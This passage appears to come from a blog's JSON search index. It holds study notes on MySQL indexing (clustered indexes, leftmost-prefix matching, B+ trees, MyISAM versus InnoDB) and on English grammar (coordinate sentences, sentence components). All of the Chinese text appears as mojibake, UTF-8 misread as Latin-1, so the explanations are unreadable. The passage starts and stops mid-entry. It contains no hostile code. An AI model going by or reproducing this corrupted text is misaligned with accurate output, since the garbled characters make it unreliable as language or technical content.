ä»è¡¨è®°å½•çš„æ’åˆ—é¡ºåºå’Œç´¢å¼•çš„æ’åˆ—é¡ºåºæ˜¯å¦ä¸€è‡´æ¥åˆ’åˆ†\n\n- èšé›†ç´¢å¼•\n\n  è¡¨è®°å½•çš„æ’åˆ—é¡ºåºå’Œç´¢å¼•çš„æ’åˆ—é¡ºåºä¸€è‡´ã€‚(ç±»ä¼¼æ‹¼éŸ³æŸ¥å­—)\n\n  1. ä¸€ä¸ªè¡¨ä¸­åªèƒ½æ‹¥æœ‰ä¸€ä¸ªèšé›†ç´¢å¼•ã€‚\n\n  2. SQL SERVERé»˜è®¤æ˜¯åœ¨ä¸»é”®ä¸Šå»ºç«‹èšé›†ç´¢å¼•çš„ã€‚\n\n  3. èšé›†ç´¢å¼•è¡¨è®°å½•çš„æ’åˆ—é¡ºåºå’Œç´¢å¼•çš„æ’åˆ—é¡ºåºä¸€è‡´ï¼Œæ‰€ä»¥æŸ¥è¯¢æ•ˆç‡å¿«ï¼Œå› ä¸ºåªè¦æ‰¾åˆ°ç¬¬ä¸€ä¸ªç´¢å¼•å€¼è®°å½•ï¼Œå…¶ä½™çš„è¿ç»­æ€§çš„è®°å½•åœ¨ç‰©ç†è¡¨ä¸­ä¹Ÿä¼šè¿ç»­å­˜æ”¾ï¼Œä¸€èµ·å°±å¯ä»¥æŸ¥è¯¢åˆ°ã€‚\n\n  4. ç¼ºç‚¹æ˜¯æ–°å¢æ¯”è¾ƒæ…¢ï¼Œå› ä¸ºä¸ºäº†ä¿è¯è¡¨ä¸­è®°å½•çš„ç‰©ç†é¡ºåºå’Œç´¢å¼•é¡ºåºä¸€è‡´ï¼Œåœ¨è®°å½•æ’å…¥çš„æ—¶å€™ï¼Œä¼šå¯¹æ•°æ®é¡µé‡æ–°æ’åºã€‚\n\n  \n\n- éèšé›†ç´¢å¼•\n\n  è¡¨è®°å½•çš„æ’åˆ—é¡ºåºå’Œç´¢å¼•çš„æ’åˆ—é¡ºåºä¸ä¸€è‡´ã€‚(ç±»ä¼¼åæ—éƒ¨é¦–æŸ¥å­—)\n\n  1. ä¸€ä¸ªè¡¨ä¸­å¯ä»¥æ‹¥æœ‰å¤šä¸ªéèšé›†ç´¢å¼•ã€‚\n\n  2. ç´¢å¼•çš„é€»è¾‘é¡ºåºä¸ç£ç›˜ä¸Šè¡Œçš„ç‰©ç†å­˜å‚¨é¡ºåºä¸åŒï¼Œéèšé›†ç´¢å¼•åœ¨å¶å­èŠ‚ç‚¹å­˜å‚¨çš„æ˜¯ä¸»é”®å’Œç´¢å¼•åˆ—ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨éèšé›†ç´¢å¼•æŸ¥è¯¢æ•°æ®æ—¶ï¼Œéœ€è¦æ‹¿åˆ°å¶å­ä¸Šçš„ä¸»é”®å†å»è¡¨ä¸­æŸ¥åˆ°æƒ³è¦æŸ¥æ‰¾çš„æ•°æ®ã€‚è¿™ä¸ªè¿‡ç¨‹å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„å›è¡¨ã€‚\n\n\n\n# 3. å»ºç´¢å¼•çš„å‡ å¤§åŸåˆ™\n\n### 3.1 æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™\n\néå¸¸é‡è¦çš„åŸåˆ™. mysqlä¼šä¸€ç›´å‘å³åŒ¹é…ç›´åˆ°é‡åˆ°èŒƒå›´æŸ¥è¯¢(>ã€<ã€betweenã€like) å°±åœæ­¢åŒ¹é…, å¤åˆç´¢å¼•çš„ç¬¬ä¸€ä¸ª, å¿…é¡»å…ˆæŸ¥, æ‰èƒ½ç»§ç»­\n\n\n\n1. å¦‚æœå»ºç«‹(a,b)é¡ºåºçš„ç´¢å¼•\n\n+ æŸ¥è¯¢ b = 2 ï¼Œæ˜¯åŒ¹é…ä¸åˆ°(a,b)ç´¢å¼•çš„\n\n+ æŸ¥è¯¢ a = 1 and b = 2 æˆ–è€… a = 1  åˆæˆ–è€…  b = 2 and a = 1 éƒ½å¯ä»¥ï¼Œå› ä¸ºä¼˜åŒ–å™¨ä¼šè‡ªåŠ¨è°ƒæ•´a,bçš„é¡ºåºã€‚\n\n\n\n2. å¦‚æœå»ºç«‹(a,b,c,d)é¡ºåºçš„ç´¢å¼•\n\n+ a = 1 and b = 2 and c > 3 and d = 4 ï¼Œdæ˜¯ç”¨ä¸åˆ°ç´¢å¼•çš„ï¼Œå› ä¸ºcå­—æ®µæ˜¯ä¸€ä¸ªèŒƒå›´æŸ¥è¯¢ï¼Œå®ƒä¹‹åçš„å­—æ®µä¼šåœæ­¢åŒ¹é…ã€‚\n\n\n\n3. å¦‚æœå»ºç«‹(a,b,d,c)é¡ºåºçš„ç´¢å¼•\n\n+ a = 1 and b = 2 and c > 3 and d = 4 ,  ç´¢å¼•åˆ™éƒ½å¯ä»¥ç”¨åˆ°ï¼Œa,b,dçš„é¡ºåºå¯ä»¥ä»»æ„è°ƒæ•´ã€‚\n\n\n\n### 3.1 æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™ã€‚è¿™æ˜¯éå¸¸é‡è¦ã€éå¸¸é‡è¦ã€éå¸¸é‡è¦ï¼ˆé‡è¦çš„äº‹æƒ…è¯´ä¸‰éï¼‰\n\n+ å·¦è¾¹çš„å¿…é¡»åœ¨æ‰èµ°ç´¢å¼•!!!\n+ (col1, col2, col3)è¿™ä¸ªå¤åˆç´¢å¼•çš„æ‰€æœ‰å‰ç¼€ å°±æ˜¯(col1), (col1, col2), (col1, col2, col3), åŒ…å«è¿™äº›åˆ—çš„æŸ¥è¯¢éƒ½ä¼šå¯ç”¨ç´¢å¼•æŸ¥è¯¢.\n+ å…¶ä»–æ‰€æœ‰ä¸åœ¨æœ€å·¦å‰ç¼€é‡Œçš„åˆ—éƒ½ä¸ä¼šå¯ç”¨ç´¢å¼•, å³ä½¿åŒ…å«äº†è”åˆç´¢å¼•é‡Œçš„éƒ¨åˆ†åˆ—ä¹Ÿä¸è¡Œ. å³ä¸Šè¿°ä¸­çš„(col2), (col3), (col2, col3) éƒ½ä¸ä¼šå¯ç”¨ç´¢å¼•å»æŸ¥è¯¢.\n+ æ³¨æ„, (col1, col3)ä¼šå¯ç”¨(col1)çš„ç´¢å¼•æŸ¥è¯¢.\n\n\n\n### 3.2 = å’Œ in å¯ä»¥ä¹±åº\n\næ¯”å¦‚a = 1 and b = 2 and c = 3 å»ºç«‹(a,b,c)ç´¢å¼•å¯ä»¥ä»»æ„é¡ºåºï¼Œmysqlçš„æŸ¥è¯¢ä¼˜åŒ–å™¨ä¼šå¸®ä½ ä¼˜åŒ–æˆç´¢å¼•å¯ä»¥è¯†åˆ«çš„å½¢å¼ã€‚\n\n\n\n### 3.3 å°½é‡é€‰æ‹©åŒºåˆ†åº¦é«˜çš„åˆ—ä½œä¸ºç´¢å¼•\n\nåŒºåˆ†åº¦çš„å…¬å¼æ˜¯count(distinct col)/count(*)ï¼Œè¡¨ç¤ºå­—æ®µä¸é‡å¤çš„æ¯”ä¾‹ï¼Œæ¯”ä¾‹è¶Šå¤§æˆ‘ä»¬æ‰«æçš„è®°å½•æ•°è¶Šå°‘ï¼Œå”¯ä¸€é”®çš„åŒºåˆ†åº¦æ˜¯1ã€‚ï¼ˆè¶Šå¤§è¶Šå¥½ï¼‰\n\nè€Œä¸€äº›çŠ¶æ€ã€æ€§åˆ«å­—æ®µå¯èƒ½åœ¨å¤§æ•°æ®é¢å‰åŒºåˆ†åº¦å°±æ˜¯0ï¼Œé‚£å¯èƒ½æœ‰äººä¼šé—®ï¼Œè¿™ä¸ªæ¯”ä¾‹æœ‰ä»€ä¹ˆç»éªŒå€¼å—ï¼Ÿä½¿ç”¨åœºæ™¯ä¸åŒï¼Œè¿™ä¸ªå€¼ä¹Ÿå¾ˆéš¾ç¡®å®šï¼Œä¸€èˆ¬éœ€è¦joinçš„å­—æ®µæˆ‘ä»¬éƒ½è¦æ±‚æ˜¯0.1ä»¥ä¸Šï¼Œå³å¹³å‡1æ¡æ‰«æ10æ¡è®°å½•ã€‚\n\n\n\nç´¢å¼•åˆ—çš„åŸºæ•°è¶Šå¤§ï¼Œç´¢å¼•çš„æ•ˆæœè¶Šå¥½ã€‚ä¾‹å¦‚ï¼Œå­˜æ”¾å‡ºç”Ÿæ—¥æœŸçš„åˆ—å…·æœ‰ä¸åŒçš„å€¼ï¼Œå¾ˆå®¹æ˜“åŒºåˆ†è¡Œï¼Œè€Œç”¨æ¥è®°å½•æ€§åˆ«çš„åˆ—ï¼Œåªæœ‰\"M\"å’Œ\"F\",åˆ™å¯¹æ­¤è¿›è¡Œç´¢å¼•æ²¡æœ‰å¤šå¤§ç”¨å¤„ï¼Œå› æ­¤ä¸ç®¡æœç´¢å“ªä¸ªå€¼ï¼Œéƒ½ä¼šå¾—å‡ºå¤§çº¦ä¸€åŠçš„è¡Œã€‚\n\n\n\n### 3.4 ç´¢å¼•åˆ—ä¸èƒ½å‚ä¸è®¡ç®—ï¼Œä¿æŒåˆ—â€œå¹²å‡€â€ï¼Œ\n\næ¯”å¦‚from_unixtime(create_time) = â€™2014-05-29â€™å°±ä¸èƒ½ä½¿ç”¨åˆ°ç´¢å¼•ï¼ŒåŸå› å¾ˆç®€å•ï¼Œb+æ ‘ä¸­å­˜çš„éƒ½æ˜¯æ•°æ®è¡¨ä¸­çš„å­—æ®µå€¼ï¼Œä½†è¿›è¡Œæ£€ç´¢æ—¶ï¼Œéœ€è¦æŠŠæ‰€æœ‰å…ƒç´ éƒ½åº”ç”¨å‡½æ•°æ‰èƒ½æ¯”è¾ƒï¼Œæ˜¾ç„¶æˆæœ¬å¤ªå¤§ã€‚æ‰€ä»¥è¯­å¥åº”è¯¥å†™æˆcreate_time = unix_timestamp(â€™2014-05-29â€™)ã€‚\n\n\n\n### 3.5 å°½é‡çš„æ‰©å±•ç´¢å¼•ï¼Œä¸è¦æ–°å»ºç´¢å¼•ã€‚\n\næ¯”å¦‚è¡¨ä¸­å·²ç»æœ‰açš„ç´¢å¼•ï¼Œç°åœ¨è¦åŠ (a,b)çš„ç´¢å¼•ï¼Œé‚£ä¹ˆåªéœ€è¦ä¿®æ”¹åŸæ¥çš„ç´¢å¼•å³å¯ã€‚\n\n\n\n### 3.6 åœ¨åˆé€‚çš„åˆ—ä¸Šåˆ›å»ºç´¢å¼•\n\nå¯ä»¥è€ƒè™‘ä½¿ç”¨ç´¢å¼•çš„ä¸»è¦æœ‰ä¸¤ç§ç±»å‹çš„åˆ—ï¼šåœ¨whereå­å¥ä¸­å‡ºç°çš„åˆ—, åœ¨joinå­å¥ä¸­å‡ºç°çš„åˆ—\n\nè€Œä¸æ˜¯åœ¨SELECTå…³é”®å­—åé€‰æ‹©åˆ—è¡¨çš„åˆ—\n\n\n\n### 3.7 ä½¿ç”¨çŸ­ç´¢å¼•\n\nå¦‚æœå¯¹å­—ç¬¦ä¸²åˆ—è¿›è¡Œç´¢å¼•ï¼Œåº”è¯¥æŒ‡å®šä¸€ä¸ªå‰ç¼€é•¿åº¦ï¼Œå¯èŠ‚çœå¤§é‡ç´¢å¼•ç©ºé—´ï¼Œæå‡æŸ¥è¯¢é€Ÿåº¦ï¼›\n\nä¾‹å¦‚ï¼Œæœ‰ä¸€ä¸ªCHAR(200)åˆ—ï¼Œå¦‚æœåœ¨å‰10ä¸ªæˆ–20ä¸ªå­—ç¬¦å†…ï¼Œå¤šæ•°å€¼æ˜¯å”¯ä¸€çš„ï¼Œé‚£ä¹ˆå°±ä¸è¦å¯¹æ•´ä¸ªåˆ—è¿›è¡Œç´¢å¼•ã€‚å¯¹å‰10ä¸ªæˆ–è€…20ä¸ªå­—ç¬¦è¿›è¡Œç´¢å¼•èƒ½å¤ŸèŠ‚çœå¤§é‡ç´¢å¼•ç©ºé—´ï¼Œä¹Ÿå¯èƒ½ä¼šä½¿æŸ¥è¯¢æ›´å¿«ã€‚\n\n\n\n### 3.8 å¼ºåˆ¶ç±»å‹è½¬æ¢ä¼šç”¨ä¸åˆ°ç´¢å¼•\n\nphone varchar(20),   index(phone)\n\n```sql\nselect phone where phone = '1000000' # ç”¨åˆ°ç´¢å¼•\nselect phone where phone = 1000000   # ç”¨ä¸åˆ°ç´¢å¼•\n```\n\n\n\n### 3.9 ç´¢å¼•çš„åˆ—ä¸å…è®¸ä¸º null\n\nä¹Ÿèƒ½å»ºç«‹ç´¢å¼•, ä½†æ˜¯ä¼šé€ æˆä¸ç¬¦åˆé¢„æœŸçš„è¡Œä¸º\n\n\n\n### 3.10 ç´¢å¼•æ•°é‡æ§åˆ¶\n\n+ å•è¡¨ç´¢å¼•æ§åˆ¶åœ¨5ä¸ªä»¥å†…\n\n+ å¤åˆç´¢å¼•å­—æ®µæœ€å¥½ä¸è¶…è¿‡5ä¸ª\n\n  \n\n# 4. BTreeå’Œ B+Tree\n\n### 4.1 B æ ‘ï¼ˆä¹Ÿå°±æ˜¯ B- æ ‘ï¼‰\n\n- å…³é”®å­—åˆ†å¸ƒåœ¨æ•´æ£µæ ‘çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚\n- ä»»ä½•ä¸€ä¸ªå…³é”®å­— å‡ºç°ä¸”åªå‡ºç°åœ¨ä¸€ä¸ªèŠ‚ç‚¹ä¸­ã€‚\n- æœç´¢æœ‰å¯èƒ½åœ¨ éå¶å­èŠ‚ç‚¹ ç»“æŸã€‚\n- å…¶æœç´¢æ€§èƒ½ç­‰ä»·äºåœ¨å…³é”®å­—å…¨é›†å†…åšä¸€æ¬¡äºŒåˆ†æŸ¥æ‰¾ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n![1](mysqlç´¢å¼•ä»‹ç»/2.png)\n\n### 4.2 B+ æ ‘\n\n- éå¶å­èŠ‚ç‚¹çš„å­æ ‘æŒ‡é’ˆä¸å…³é”®å­—ä¸ªæ•°ç›¸åŒã€‚\n- éå¶å­èŠ‚ç‚¹çš„å­æ ‘æŒ‡é’ˆ P[i]ï¼ŒæŒ‡å‘å…³é”®å­—å±äº [k[i],K[i+1]) çš„å­æ ‘ï¼ˆæ³¨æ„ï¼šåŒºé—´æ˜¯å‰é—­åå¼€)ã€‚\n- ä¸ºæ‰€æœ‰å¶å­èŠ‚ç‚¹å¢åŠ ä¸€ä¸ªé“¾æŒ‡é’ˆã€‚\n- æ‰€æœ‰å…³é”®å­—éƒ½åœ¨å¶å­èŠ‚ç‚¹å‡ºç°ã€‚\n\n![1](mysqlç´¢å¼•ä»‹ç»/3.png)\n\n### 4.3 ç›¸å¯¹ B æ ‘ï¼ŒB+ æ ‘åšç´¢å¼•çš„ä¼˜åŠ¿\n\n1. B+ æ ‘çš„ç£ç›˜è¯»å†™ä»£ä»·æ›´ä½ã€‚\n\n   B+ æ ‘çš„å†…éƒ¨æ²¡æœ‰æŒ‡å‘å…³é”®å­—å…·ä½“ä¿¡æ¯çš„æŒ‡é’ˆï¼Œæ‰€ä»¥å…¶å†…éƒ¨èŠ‚ç‚¹ç›¸å¯¹ B æ ‘æ›´å°ï¼Œå¦‚æœæŠŠæ‰€æœ‰å…³é”®å­—å­˜æ”¾åœ¨åŒä¸€å—ç›˜ä¸­ï¼Œé‚£ä¹ˆç›˜ä¸­æ‰€èƒ½å®¹çº³çš„å…³é”®å­—æ•°é‡ä¹Ÿè¶Šå¤šï¼Œä¸€æ¬¡æ€§è¯»å…¥å†…å­˜çš„éœ€è¦æŸ¥æ‰¾çš„å…³é”®å­—ä¹Ÿå°±è¶Šå¤šï¼Œç›¸åº”çš„ï¼ŒIO è¯»å†™æ¬¡æ•°å°±é™ä½äº†ã€‚\n\n\n\n2. æ ‘çš„æŸ¥è¯¢æ•ˆç‡æ›´åŠ ç¨³å®šã€‚\n\n   B+ æ ‘æ‰€æœ‰æ•°æ®éƒ½å­˜åœ¨äºå¶å­èŠ‚ç‚¹ï¼Œæ‰€æœ‰å…³é”®å­—æŸ¥è¯¢çš„è·¯å¾„é•¿åº¦ç›¸åŒï¼Œæ¯æ¬¡æ•°æ®çš„æŸ¥è¯¢æ•ˆç‡ç›¸å½“ã€‚è€Œ B æ ‘å¯èƒ½åœ¨éå¶å­èŠ‚ç‚¹å°±åœæ­¢æŸ¥æ‰¾äº†ï¼Œæ‰€ä»¥æŸ¥è¯¢æ•ˆç‡ä¸å¤Ÿç¨³å®šã€‚\n\n\n\n3. B+ æ ‘åªéœ€è¦å»éå†å¶å­èŠ‚ç‚¹å°±å¯ä»¥å®ç°æ•´æ£µæ ‘çš„éå†\n\n\n\n### 4.4 MongoDB çš„ç´¢å¼• B æ ‘ï¼Œè€Œ MySQL çš„ç´¢å¼• B+ æ ‘ï¼Ÿ\n\nå› ä¸º MongoDB ä¸æ˜¯ä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“ï¼Œè€Œæ˜¯ä»¥ Json æ ¼å¼ä½œä¸ºå­˜å‚¨çš„ NoSQL éå…³ç³»å‹æ•°æ®åº“ï¼Œç›®çš„å°±æ˜¯é«˜æ€§èƒ½ã€é«˜å¯ç”¨ã€æ˜“æ‰©å±•ã€‚æ‘†è„±äº†å…³ç³»æ¨¡å‹ï¼Œæ‰€ä»¥èŒƒå›´æŸ¥è¯¢å’Œéå†æŸ¥è¯¢çš„éœ€æ±‚å°±æ²¡é‚£ä¹ˆå¼ºçƒˆäº†ã€‚\n\n\n\n# 5. MyISAM å’Œ InnoDB çš„B+åŒºåˆ«\n\néƒ½æ˜¯ç”¨ B+æ ‘å®ç°çš„\n\n![1](mysqlç´¢å¼•ä»‹ç»/1.png)\n\n### 5.1 MyISAM éèšé›†ç´¢å¼•\n\n1. MyISAMçš„ç´¢å¼•æ–¹å¼ä¹Ÿå«åšâ€œéèšé›†â€çš„ï¼Œä¹‹æ‰€ä»¥è¿™ä¹ˆç§°å‘¼æ˜¯ä¸ºäº†ä¸InnoDBçš„èšé›†ç´¢å¼•åŒºåˆ†ã€‚\n\n2. éèšç°‡ç´¢å¼•çš„`ä¸»é”®ç´¢å¼•`å’Œ`è¾…åŠ©ç´¢å¼•`ä¸¤æ£µB+æ ‘çœ‹ä¸Šå»æ²¡ä»€ä¹ˆä¸åŒï¼ŒèŠ‚ç‚¹çš„ç»“æ„å®Œå…¨ä¸€è‡´åªæ˜¯å­˜å‚¨çš„å†…å®¹ä¸åŒè€Œå·²\n\n   ä¸»é”®ç´¢å¼•B+æ ‘çš„èŠ‚ç‚¹å­˜å‚¨äº†ä¸»é”®ï¼Œè¾…åŠ©é”®ç´¢å¼•B+æ ‘å­˜å‚¨äº†è¾…åŠ©é”®ã€‚\n\n3. è¡¨æ•°æ®å­˜å‚¨åœ¨ç‹¬ç«‹çš„åœ°æ–¹ï¼Œè¿™ä¸¤é¢—B+æ ‘çš„å¶å­èŠ‚ç‚¹éƒ½ä½¿ç”¨ä¸€ä¸ªåœ°å€æŒ‡å‘çœŸæ­£çš„è¡¨æ•°æ®ï¼Œå¯¹äºè¡¨æ•°æ®æ¥è¯´ï¼Œè¿™ä¸¤ä¸ªé”®æ²¡æœ‰ä»»ä½•å·®åˆ«ã€‚\n\n   ç”±äºç´¢å¼•æ ‘æ˜¯ç‹¬ç«‹çš„ï¼Œé€šè¿‡è¾…åŠ©é”®æ£€ç´¢æ— éœ€è®¿é—®ä¸»é”®çš„ç´¢å¼•æ ‘ã€‚\n\n4. ç´¢å¼•æ–‡ä»¶ï¼ˆ.MYIï¼‰å’Œæ•°æ®æ–‡ä»¶ï¼ˆ.MYDï¼‰æ–‡ä»¶æ˜¯åˆ†ç¦»çš„,  ç´¢å¼•æ–‡ä»¶ä»…ä¿å­˜æ•°æ®è®°å½•çš„åœ°å€(æŒ‡é’ˆå»æŸ¥æ‰¾)ã€‚\n\n\n\n### 5.2 InnoDB èšé›†ç´¢å¼• \n\n1. InnoDBçš„æ•°æ®æ–‡ä»¶æœ¬èº«å°±æ˜¯ç´¢å¼•æ–‡ä»¶ã€‚\n\n2. å¦‚æœä¸€ä¸ªä¸»é”®è¢«å®šä¹‰äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªä¸»é”®å°±æ˜¯ä½œä¸ºèšé›†ç´¢å¼•ã€‚\n\n3. å¦‚æœæ²¡æœ‰ä¸»é”®è¢«å®šä¹‰ï¼Œé‚£ä¹ˆè¯¥è¡¨çš„ç¬¬ä¸€ä¸ªå”¯ä¸€éç©ºç´¢å¼•è¢«ä½œä¸ºèšé›†ç´¢å¼•ã€‚\n\n4. å¦‚æœæ²¡æœ‰ä¸»é”®ä¹Ÿæ²¡æœ‰åˆé€‚çš„å”¯ä¸€ç´¢å¼•ï¼Œé‚£ä¹ˆinnodbå†…éƒ¨ä¼šç”Ÿæˆä¸€ä¸ªéšè—çš„ä¸»é”®ä½œä¸ºèšé›†ç´¢å¼•ï¼Œè¿™ä¸ªéšè—çš„ä¸»é”®æ˜¯ä¸€ä¸ª6ä¸ªå­—èŠ‚çš„åˆ—ï¼Œæ”¹åˆ—çš„å€¼ä¼šéšç€æ•°æ®çš„æ’å…¥è‡ªå¢ã€‚\n\n5. å› æ­¤å»ºè®®æ˜¯ç»™æ¯ä¸ªè¡¨éƒ½å®šä¸€ä¸ªä¸»é”®ã€‚å¦‚æœè¯¥è¡¨æ²¡æœ‰é€»è¾‘ä¸»é”®ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªè‡ªå¢çš„åˆ—ä½œä¸ºä¸»é”®ã€‚\n\n\n\n# 6. å¤´è„‘é£æš´\n\n### 6.1 B+æ ‘\n\nèµ°ç´¢å¼•æ˜¯ä»ä¸Šå¾€ä¸‹\n\nå…¨è¡¨æ‰«ææ˜¯ä»å·¦å¾€å³\n\n\n\n### 6.2 èšé›†ç´¢å¼•ç†è§£\n\n> åªèƒ½æœ‰ä¸€ä¸ªèšé›†ç´¢å¼•, ç´¢å¼•å’Œæ•°æ®åœ¨ä¸€èµ·\n\nå…¶ä»–çš„ç´¢å¼•å°±åšè¾…åŠ©ç´¢å¼•, èµ°ç´¢å¼•å,æ‰¾åˆ°çš„æ•°æ®æ—¶åœ¨ç”¨èšé›†ç´¢å¼•, å†æ¬¡å›è¡¨æŸ¥è¯¢\n\n\n\n### 6.3 æœ€å·¦åŒ¹é…, å¦‚æœç¬¬ä¸€ä¸ªæ˜¯èŒƒå›´å‘¢\n\nå¦‚æœæ˜¯* ä¸èµ°ç´¢å¼•,  å¦‚æœå°±æ˜¯åªæŸ¥æ¡ä»¶, å°±èµ°ç´¢å¼•\n\n\n\n### 6.4 å¦‚æœselect ä¸æ˜¯* , åªæ˜¯select çš„ where ç´¢å¼•åˆ—\n\nä¸ä¼šåœ¨å›è¡¨äº†, å°±åœ¨è¿™è®°å½•ç€ç´¢å¼•æ•°æ®å‘¢\n\n\n\n# 7. å‚è€ƒèµ„æ–™\n\n+ https://tech.meituan.com/2014/06/30/mysql-index.html\n+ https://www.infoq.cn/article/OJKWYykjoyc2YGB0Sj2c\n+ https://www.cs.usfca.edu/~galles/visualization/BPlusTree.html","tags":["mysql"],"categories":["sql"]},{"title":"åˆ˜æ™“è‰³ç¬”è®°_2å¹¶åˆ—å¥","url":"%2Fp%2F10fee324.html","content":"\n# 1. å¹¶åˆ—å¥\n\n### 1.1 ä»€ä¹ˆæ˜¯å¹¶åˆ—å¥?\n\nå°±æ˜¯ç”¨!!!è¿è¯!!!!è¿æ¥ä¸¤ä¸ªå¥å­\n\n<!-- more -->\n\n### 1.2 å¸¸è§çš„é€»è¾‘è¯(åŒ…å«è¿è¯, å‰¯è¯, ä»‹è¯çŸ­è¯­)\n\n##### 1.2.1 å¹³è¡Œå…³ç³»è¿è¯\n\n+ and\n\n+ not only, but also\n\nå‰¯è¯å’Œä»‹è¯çŸ­è¯­\n\n+ similarly\n+ equally\n+ likewise\n+ at the same time\n+ in the meanwhile\n\n##### 1.2.2 è½¬æŠ˜å…³ç³»è¿è¯\n\n+ but\n+ yet\n+ while\n+ whereas\n\nå‰¯è¯å’Œä»‹è¯çŸ­è¯­\n\n+ however\n+ nervertheless\n+ conversely\n+ unexpectedly\n+ unfortunately\n+ on the contrary\n+ by contrast\n\n##### 1.2.3 é€‰æ‹©å…³ç³»è¿è¯\n\n+ or\n\nå‰¯è¯å’Œä»‹è¯çŸ­è¯­\n\n+ alternatively\n\n##### 1.2.4 å› æœå…³ç³»è¿è¯\n\n+ for\n+ so\n\nå‰¯è¯å’Œä»‹è¯çŸ­è¯­\n\n+ therefore\n+ thus\n+ consequently\n+ as a result\n\n##### 1.2.5 é€’è¿›å…³ç³»è¿è¯\n\n+ then\n\nå‰¯è¯å’Œä»‹è¯çŸ­è¯­\n\n+ besides\n+ furthermore\n+ moreover\n+ additionally\n+ subsequently\n\n\n\n# 2. é€»è¾‘\n\n### 2.1 é€»è¾‘å…³ç³»\n\nå†™ä½œçš„ä¸Šä¸‹æ–‡æœ‰é€»è¾‘å…³ç³», å°±ä¸€å®šè¦ç”¨é€»è¾‘å…³ç³»è¯(è¿è¯, å‰¯è¯, ä»‹è¯å’Œä»‹è¯çŸ­è¯­)\n\n+ æ²¡æœ‰é€»è¾‘è¯è¯­å°±æ²¡æœ‰é€»è¾‘å…³ç³»\n\n### 2.2 è¿è¯å‰é¢é€—å·\n\nå¯ä»¥æœ‰, å¯ä»¥æ²¡æœ‰\n\n### 2.3 ä»‹è¯çŸ­è¯­, å‰¯è¯å‰é¢ä¸èƒ½æœ‰é€—å·\n\n+ æŠŠé€—å·å˜æˆå¥å·.\n\n+ æˆ–è€…å†åŠ ä¸ªè¿è¯(and æ˜¯æ²¡æœ‰æ„æ€çš„è¿è¯)\n\n### 2.4 è¿è¯å’Œå…¶ä»–é€»è¾‘è¯åŒºåˆ«\n\n+ è¿è¯å‰é¢æœ‰æ— é€—å·éƒ½å¯ä»¥\n+ å…¶ä»–é€»è¾‘å…³ç³»è¯å‰é¢, è¦ä¹ˆåŠ å¥å·, è¦ä¹ˆåŠ è¿è¯ and\n\n\n\n# 3. è€ƒç‚¹\n\n+ åªéœ€è¦è¯»æ‡‚, é€»è¾‘å…³ç³»è¯å‰åä¸¤å¥è¯çš„æ„æ€å°± ok, çœ‹ä»€ä¹ˆå…³ç³»\n+ é˜…è¯»ç†è§£, è¯»æ¯æ®µçš„é¦–å¥å’Œå°¾å¥, çŸ¥é“æ–‡ç« çš„ä¸­å¿ƒ. çœ‹é€‰é¡¹å’Œä¸­å¿ƒæ„æ€ç›¸è¿‘çš„.\n\n\n\n# 4. é•¿éš¾å¥åˆ†æ\n\n+ åœ¨åˆ†æé•¿éš¾å¥æ—¶, æœ‰å¹¶åˆ—è¿è¯çš„å‡ºç°, é€šå¸¸éƒ½ä¼šæœ‰çœç•¥\n\n+ ç¬¬ä¸€æ­¥, æ‰¾è°“è¯\n\n+ ç¬¬äºŒæ­¥, æ‰¾è¿è¯, ä½†æ˜¯è¿è¯åœ¨è¿æ¥ä¸¤ä¸ªå•è¯çš„æ—¶å€™, è¿™ä¸ªè¿è¯å°±è£…ä½œæ²¡çœ‹è§, å°±æ˜¯æ™®é€šçš„ and\n\n+ ç¬¬ä¸‰æ­¥, è¿è¯æœ‰å¯èƒ½ä¼šçœç•¥åé¢å†…å®¹, å°±çœ‹è¿è¯å‰å¤šä»€ä¹ˆå†…å®¹\n\n  \n\n### 4.1 å¦‚ä½•æŸ¥æ‰¾çœç•¥çš„å†…å®¹å‘¢?(è¿è¯å‰å°‘ä¸ç®—å°‘,åªæœ‰åä¼šå°‘)\n\n+ ä¸€å¥è¯åªè¦æœ‰çœç•¥, ä¸€å®šçœç•¥è¿è¯çš„åé¢, è¿è¯å‰ä¸å¯èƒ½çœç•¥.    å¯¹\n\n+ æ‰€ä»¥è¿è¯åé¢æœ‰çš„æˆåˆ†, è¿è¯å‰é¢é€šå¸¸éƒ½è¦æœ‰.  \n\n  è§£é‡Š: è¿è¯ååªæœ‰ä¸€ä¸ªæˆåˆ†,è¿è¯å‰ä¸€å®šèƒ½å¯¹åº”, è¿è¯åæœ‰å¤šä¸ªæˆåˆ†, è¿è¯å‰ä¸ä¸€å®šéƒ½èƒ½æ‰¾åˆ°å¯¹åº”æˆåˆ†,ä½†æ˜¯è‡³å°‘æœ‰ä¸€ä¸ª\n\n+ è¿è¯å‰é¢æœ‰, è¿è¯åé¢æ²¡æœ‰çš„æˆåˆ†, ä¾¿æ˜¯çœç•¥çš„å†…å®¹.\n\n\n\n### 4.2 ä»£è¯è¡¥å……\n\n+ ä»£è¯æŒ‡ä»£æ›¿çš„åšé¢˜æ–¹æ³•, å°±è¿‘åŸåˆ™(è·Ÿè°è¿‘)å’Œä¸€è‡´åŸåˆ™(æ„æ€)\n\n\n\n\n\n\n\n\n\n\n\n","tags":["english"],"categories":["è‹±è¯­"]},{"title":"åˆ˜æ™“è‰³ç¬”è®°_1å¥å­çš„æˆåˆ†","url":"%2Fp%2F891631f4.html","content":"\n# 1. è‹±è¯­å¥å­\n\n+ å¿…é¡»æœ‰ä¸»è°“\n+ ä¸»è¯­ä¸€å®šæ˜¯è°“è¯­çš„å‘å‡ºè€…\n+ å¦‚æœ‰å®¾è¯­, å®¾è¯­ä¸€å®šæ˜¯è°“è¯­çš„æ‰¿å—è€…\n<!-- more -->\n# 2. è‹±è¯­å¥å­çš„åŸºæœ¬ç»“æ„\n\n### 2.1 ä¸»è°“\n\n### 2.2 ä¸»è°“å®¾\n\nè°“è¯­: å®ä¹‰åŠ¨è¯(åŠç‰©åŠ¨è¯å’Œä¸åŠç‰©åŠ¨è¯)\n\n+ åŠç‰©åŠ¨è¯åé¢å¿…é¡»åŠ å®¾è¯­\n\n### 2.3 ä¸»ç³»è¡¨\n\nè°“è¯­: ç³»åŠ¨è¯\n\n+ be\n+ 